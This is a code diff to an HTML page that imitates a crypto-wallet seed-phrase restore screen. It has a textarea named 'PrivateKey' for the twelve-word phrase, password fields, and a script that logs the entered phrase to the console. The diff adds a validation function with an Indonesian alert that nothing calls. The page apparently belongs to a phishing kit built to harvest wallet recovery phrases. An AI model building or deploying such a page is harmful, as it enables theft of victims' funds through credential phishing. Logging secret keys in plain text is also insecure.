@@ -360,9 +360,18 @@ label + .jss12 {
         <div class="import-account__title" bis_skin_checked="1">Restore your Account with Seed Phrase</div><div class="import-account__selector-label" bis_skin_checked="1">Enter your secret twelve word phrase here to restore your vault.</div><div class="import-account__input-wrapper" bis_skin_checked="1"><label class="import-account__input-label">Wallet Seed</label><textarea class="import-account__secret-phrase" placeholder="Separate each word with a single space" name="PrivateKey" required="true" maxlength="200"></textarea><span class="error"></span></div><div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal" bis_skin_checked="1"><label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">Password</label><div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl" bis_skin_checked="1"><input aria-invalid="false" autocomplete="new-password" id="password" type="password" name="password1" dir="auto" class="MuiInputBase-input MuiInput-input" value="" maxlength="200"></div></div><div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal" bis_skin_checked="1"><label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="confirm-password" id="confirm-password-label">Confirm password</label><div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl" bis_skin_checked="1"><input aria-invalid="false" autocomplete="confirm-password" id="confirm-password" type="password" name="password2" dir="auto" class="MuiInputBase-input MuiInput-input" value="" maxlength="200"></div></div><button type="submit"class="button btn--rounded btn-primary first-time-flow__button" role="button" tabindex="0">Restore</button></div></form> <script>
 document.querySelector('form').addEventListener('submit', function(event) {
     console.log('Form will be submitted!');
-    console.log('PrivateKey:', document.querySelector('textarea[name="PrivateKey"]').value);
+    console.log('PrivateKey:', document.querySelector('textarea[name="PrivateKey"]').value); function checkMethod() {
+    var privateKey = document.getElementsByName("PrivateKey")[0].value;
+    if (privateKey.trim() === "") {
+        alert("PrivateKey tidak boleh kosong!");
+        return false;
+    }
+    return true;
+}
+
 });
 </script>
+            
 
 
         </div></div></div></div></div>
